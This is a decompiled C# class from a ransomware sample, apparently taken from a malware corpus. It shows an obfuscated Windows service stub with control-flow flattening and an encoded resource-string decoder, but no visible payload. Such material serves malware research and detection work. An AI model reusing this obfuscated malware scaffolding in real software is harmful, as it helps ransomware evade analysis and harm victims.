// Decompiled with JetBrains decompiler
// Type: Ⴃ.ႥႰ
// Assembly: mac, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4DC2FD3D-9120-41A8-AE25-CC48D06B9902
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-4340105078ffe071abe405ad3dc31e12fd66187057ce4929d7c0f635218805af.exe

using System;
using System.ComponentModel;
using System.Globalization;
using System.Resources;
using System.Runtime.InteropServices;
using System.ServiceProcess;

namespace Ⴃ
{
  internal sealed class ႥႰ : ServiceBase
  {
    private ႤႳ.Ⴄ Ⴅ = new ႤႳ.Ⴄ();

    public ႥႰ() => this.Ⴓ();

    protected override void OnStart([In] string[] obj0)
    {
    }

    protected override void OnStop()
    {
    }

    internal static void Ⴐ() => ႣႣ.Ⴄ = new Random(ႭႣ.Ⴗ);

    protected override void Dispose([In] bool obj0)
    {
      int num = 3;
      while (true)
      {
        switch (num)
        {
          case 0:
            goto label_6;
          case 1:
          case 5:
            goto label_4;
          case 2:
            num = this.Ⴅ.Ⴄ == null ? 4 : 1;
            continue;
          case 4:
            goto label_5;
          default:
            num = !obj0 ? 4 : 2;
            continue;
        }
      }
label_6:
      return;
label_4:
      this.Ⴅ.Ⴄ.Dispose();
label_5:
      base.Dispose(obj0);
    }

    private void Ⴓ()
    {
      this.Ⴅ.Ⴄ = (IContainer) new Container();
      ႳႰ.Ⴄ<ServiceBase, string>((ServiceBase) this, ႭႭ.Ⴈ(typeof (ႭႰ), 2L, 3, 1951761497), (short) 735, 'ʷ');
    }

    static ႥႰ() => ႳႣ.Ⴅ();

    internal static string Ⴄ<\u0021\u00210, \u0021\u00211, \u0021\u00212>(
      [In] \u0021\u00211 obj0,
      [In] \u0021\u00212 obj1,
      [In] \u0021\u00210 obj2,
      [In] int obj3,
      [In] char obj4)
      where \u0021\u00210 : CultureInfo
      where \u0021\u00211 : ResourceManager
      where \u0021\u00212 : string
    {
      byte[] ⴍ = ႣႣ.Ⴍ;
      char[] ⴗ = ႷႼ.Ⴗ;
label_3:
      int num1 = 0;
      int num2 = 3;
      object obj;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_3;
          case 1:
          case 8:
            goto label_12;
          case 3:
            int num3;
            switch ((obj3 ^ (int) obj4) - 34 ^ num1)
            {
              case 0:
                num3 = 6;
                break;
              default:
                num3 = (int) ⴍ[178] - (int) ⴍ[25];
                break;
            }
            num2 = num3;
            continue;
          case 4:
            ++num1;
            int num4 = (int) obj4;
            int num5 = num4 * num4 + (int) obj4;
            ႷႨ.Ⴐ[323] = (byte) (((int) ႷႨ.Ⴐ[323] | obj3) & 170);
            num2 = num5 % 2 == 0 ? 8 : 10;
            continue;
          case 6:
          case 11:
            obj = (object) obj0.GetString((string) obj1, (CultureInfo) obj2);
            num2 = 4;
            continue;
          case 7:
            num2 = 3;
            continue;
          case 9:
            obj = (object) null;
            num2 = (int) ⴗ[76] - 49899;
            continue;
          case 10:
            num2 = (int) ⴗ[2] - 30456;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႥႰ.Ⴄ);
            num2 = 0;
            continue;
        }
      }
label_12:
      return obj as string;
    }
  }
}
